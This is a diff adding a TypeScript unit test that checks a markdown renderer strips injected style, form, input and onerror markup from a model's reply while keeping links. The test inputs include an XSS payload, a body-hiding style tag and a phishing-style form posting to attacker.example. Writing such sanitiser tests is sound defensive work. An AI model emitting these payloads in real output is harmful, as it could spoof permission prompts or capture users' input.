@@ -35,6 +35,27 @@ describe('markdown-blocks', () => {
     expect(renderMarkdownBlocks('')).toEqual([]);
   });
 
+  it('renderMarkdownBlocks_stripsWhatCouldRestyleTheWindowOrTakeInput_butKeepsLinks', () => {
+    // Audit S5: a model's reply shares the window with the permission card it might be asking about.
+    const html: string = renderMarkdownBlocks(
+      [
+        '<style>body{display:none}</style>',
+        '<form action="https://attacker.example"><input name="q"><button>go</button></form>',
+        '',
+        'See [the docs](https://example.test) and <img src="x" onerror="alert(1)">.',
+      ].join('\n'),
+    )
+      .map((block: MarkdownBlock): string => (block.kind === 'html' ? block.html : ''))
+      .join('');
+
+    expect(html).not.toContain('<style');
+    expect(html).not.toContain('<form');
+    expect(html).not.toContain('<input');
+    expect(html).not.toContain('onerror');
+    expect(html).toContain('href="https://example.test"');
+    expect(html).toContain('<img src="x">');
+  });
+
   it('renderMarkdownBlocks_whenProseSurroundsAFence_splitsThemIntoOrderedBlocks', () => {
     const blocks: MarkdownBlock[] = renderMarkdownBlocks(
       'Before\n\n```js\nconst a = 1;\n```\n\nAfter',
